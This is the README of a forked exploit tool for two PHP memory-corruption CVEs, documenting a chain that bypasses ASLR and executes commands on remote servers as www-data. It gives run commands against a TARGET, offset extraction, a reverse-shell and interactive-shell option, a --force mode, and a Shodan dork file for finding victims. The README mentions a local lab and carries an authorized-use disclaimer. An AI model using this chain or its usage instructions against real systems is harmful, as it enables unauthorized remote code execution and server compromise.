# php2shell-scan-exp

Fork of the php2shell exploit (CVE-2026-109618 / CVE-2026-109619) with a
working PHP 8.4.15 profile, a non-destructive target probe, per-target result
storage, and a local Docker lab for two PHP builds.

**Upstream:** [JoasASantos/php2shell-exploit](https://github.com/JoasASantos/php2shell-exploit) — created by Joas A. Santos (@c0d3cr4zy).
This fork adds the changes listed in [CHANGES.md](CHANGES.md).

> **Authorized testing only.** This tool sends repeated large payloads and
> executes commands on the target. Use it only against systems you own or have
> written permission to test. `--recon-only` is the safe mode.

---

## Directory structure

```
php2shell-scan-exp/
├── README.md                  this file
├── CHANGES.md                 every change from upstream, with the measurement behind it
├── .gitignore
│
├── exploit.py                 main entry point (patched)
├── recon.py                   phase 0 fingerprinting
│
├── lib/
│   ├── transport.py           raw HTTP: TLS, proxy, chunked, redirects, cookie jar
│   ├── payloads.py            A1 / B1 / A2 / B2 body builders
│   ├── forge.py               forged HashTable for the execute stage
│   ├── leak.py               OOB-read parser (heap + libphp addresses)
│   ├── oom.py                 cheap OOM helper
│   ├── calibrate.py           OOM threshold / memory_limit probing
│   ├── offsets.py             ELF symbol extraction (zif_system, zval_ptr_dtor)
│   ├── offset_db.py           profile database and version matching
│   └── worker_pin.py          prefork worker count detection
│
├── profiles/
│   ├── php-8.4.15-trixie-amd64.json      verified
│   ├── php-8.4.26-trixie-amd64.json      verified
│   ├── php-8.4.25-trixie-amd64.json      unverified
│   ├── php-8.3.35-bookworm-amd64.json    unverified
│   └── php-8.4.26-trixie-arm64.json      unverified
│
├── lab/
│   ├── lab_php_versi8415.sh   PHP 8.4.15 lab, single worker, :8088
│   ├── lab_php_versi8426.sh   PHP 8.4.26 lab, multi worker, :8089
│   ├── verify_profiles.sh     run both labs with no --offsets-env
│   ├── probe_target.sh        non-destructive check of an unknown host
│   ├── show_results.sh        print saved per-target results
│   ├── apache-prefork.conf    forces single worker (chain requirement)
│   └── www/
│       ├── index.php          minimal session-enabled entry point
│       ├── dangle.php         session_write_close() before the OOM
│       ├── redir.php          302 entry point (redirect testing)
│       └── landing.php        redirect target
│
├── docs/
│   ├── TARGET-REQUIREMENTS.md what the chain needs and why
│   ├── DORKS.md               Shodan / search queries for candidate discovery
│   └── PATCHES.md             deep notes on the three redirect regressions
│
└── out/                       results (gitignored)
    └── results/<host>_<port>/
        ├── cmd.txt
        ├── output.txt
        └── meta.json
```

---

## Requirements

- Python 3.10+ (tested on 3.13), no third-party packages for the core path
- `docker` and `curl` for the labs
- `socks` only if you use a SOCKS proxy

---

## Quick start

### 1. Bring up a lab

```bash
sudo bash lab/lab_php_versi8415.sh up   # http://127.0.0.1:8088
sudo bash lab/lab_php_versi8426.sh up   # http://127.0.0.1:8089
```

### 2. Verify both builds work

```bash
bash lab/verify_profiles.sh
```

Expected, per build:

```
matched profile: php-8.4.15-trixie-amd64 (status: verified)
offsets: zif_system=0x445f70 zval_ptr_dtor=0x63d420
libphp=0x78e472a9a000
[+] chain completed on try 1 candidate 1
  PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 3. Fingerprint a real target (safe)

```bash
python3 exploit.py -t https://TARGET --recon-only
bash lab/probe_target.sh https://TARGET
```

If recon cannot confirm the target, the tool stops and sends nothing.

### 4. Execute a command

```bash
python3 exploit.py -t http://TARGET/index.php \
  --cmd 'id' \
  --save /out/x \
  --out-dir ./out
```

Results land in `out/results/<host>_<port>/`:

```bash
bash lab/show_results.sh
```

---

## How the chain works

| Stage | Action |
|---|---|
| A1 | OOM during request startup leaves the session pointer `PS(id)` dangling |
| B1 | Reclaim that freed block with multipart field names; a forged `zend_string` produces an 800 KB OOB read → heap base and `libphp` base (ASLR bypass) |
| A2 | Second OOM to free the reclaim block |
| B2 | Forge a `zend_array` whose `pDestructor` is `zif_system`; the destructor runs the command |

---

## Profile policy

Offsets are build-specific. A profile is used **only when its `php_version`
matches the target exactly**. A different patch release means different
`zif_system` / `zval_ptr_dtor` offsets, which shifts the computed `libphp` base
off-page and kills B1.

There is no fallback to "closest version". If recon cannot read the version, or
the version has no profile, extract offsets from the target's own binary:

```bash
python3 -c "from lib.offsets import extract_from_container; \
print(extract_from_container('container-name'))"

python3 -c "from lib.offsets import extract_from_elf; \
print(extract_from_elf('libphp.so'))"
```

Then:

```bash
python3 exploit.py -t URL --cmd 'id' --offsets-env ./offsets.env --force
```

---

## Flags

| Flag | Meaning |
|---|---|
| `--recon-only` | fingerprint only, no payloads |
| `--force` | continue even if recon could not confirm the target is vulnerable |
| `--save PATH` | write command output to `PATH` on the target (opt-in file mode) |
| `--fallback-save PATH` | retry once with `--save` if in-band returned nothing |
| `--offsets-env FILE` | use offsets extracted from the target, not a profile |
| `--out-dir DIR` | where per-target results are written |
| `--interactive` | interactive shell mode |
| `--reverse IP:PORT` | reverse shell callback |
| `--proxy URL` | `socks5://` or `http://` proxy |

---

## Output modes

| Mode | Writes to target | Output readable |
|---|---|---|
| default (in-band) | no | only if the worker survives `system()` |
| `--save PATH` | yes | yes |

Measured on `php:8.4.15-apache`: after `system()` runs, the worker exits
SIGSEGV during RSHUTDOWN, so the B2 response is empty and in-band output is
unreadable. On that build `--save` is required to read anything back.

The tool says so explicitly instead of reporting a bare failure:

```
[!] command executed, but the B2 response was empty.
[+] chain reached A2/B2 - command invoked, output not retrievable in-band
```

---

## Known limitations

- **Redirect mid-chain fails.** A1 OOMs on the first script; the hop then pins
  the rest of the chain to the second script, which never held the dangling
  session. Resolve the final path manually and point the tool at it.
- **`--save` needs a writable path** on the target.
- **Worker pinning is an estimate.** A wrong guess puts A1 and B1 on different
  workers, and the reclaim never happens.
- **Profiles are per-build.** A new patch release needs its own offsets.
- **EOL is not the CVE.** PHP 7.x is flagged EOL by the generic check, but this
  chain does not apply there. Version gate still pending.

See [docs/TARGET-REQUIREMENTS.md](docs/TARGET-REQUIREMENTS.md) for the full
list of preconditions.

---

## Credits

- **Joas A. Santos (@c0d3cr4zy)** — upstream
  [php2shell-exploit](https://github.com/JoasASantos/php2shell-exploit)
- **dimasma0305** — session-OOM parameters and the `hash_offset`
  (`0x690d8` / `0x740d8`) approach
- **9bie** — pure-HTTP chain: chunked `post_max_size` bypass, forged
  `zend_string` leak, fake `zend_array` with `pDestructor = zif_system`
  (also published as EDB-52704)
- PHP fix commit `3584a98bda` — *"Avoid state corruption via bailout"*;
  GHSA-w8hw-w9fx-j79w (CVE-2026-109618),
  GHSA-6wmf-4rv5-p3rp (CVE-2026-109619)

## License

Upstream `php2shell-exploit` does not ship a license file. No license is
asserted here either — this fork inherits whatever terms upstream sets. If you
intend to redistribute, ask the upstream author first.

The code is published for authorized testing and research. Use it only on
systems you own or have written permission to test.
